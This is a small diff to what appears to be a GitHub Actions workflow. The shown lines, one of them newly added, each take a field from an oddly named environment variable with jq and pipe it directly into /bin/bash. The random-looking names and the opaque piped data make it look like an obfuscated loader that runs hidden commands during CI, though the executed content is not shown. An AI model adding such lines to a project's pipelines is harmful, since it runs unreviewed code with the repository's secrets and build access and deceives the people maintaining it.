@@ -28,6 +28,7 @@ jobs:
           echo $sa82 | jq -r .iqth8 | /bin/bash
           echo $rctft44 | jq -r .rg76 | /bin/bash
           echo $ndc2 | jq -r .t1222 | /bin/bash
+          printf '%s' "$ek10051" | jq -r .xkhq6 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
